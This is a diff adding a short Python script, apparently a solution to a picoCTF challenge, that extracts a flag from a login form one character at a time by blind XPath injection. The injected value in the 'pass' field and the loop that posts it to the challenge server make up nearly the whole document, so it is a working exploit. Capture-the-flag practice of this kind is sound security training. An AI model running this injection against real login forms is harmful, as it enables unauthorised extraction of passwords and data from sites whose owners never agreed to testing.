@@ -1,0 +1,15 @@
+import string
+
+import requests
+
+password = "picoCTF{"
+
+while True:
+    for c in string.printable:
+        print(f"Trying {password+c}")
+        data ={"name":"admin", "pass":f"' or //*[contains(., '{password+c}')] or 'a' = 'b"}
+        # //*[starts-with(text(),'ab')]
+        r = requests.post("http://mercury.picoctf.net:28065/", data=data)
+        if "You&#39;re on the right path." in r.text:
+            password += c
+            break
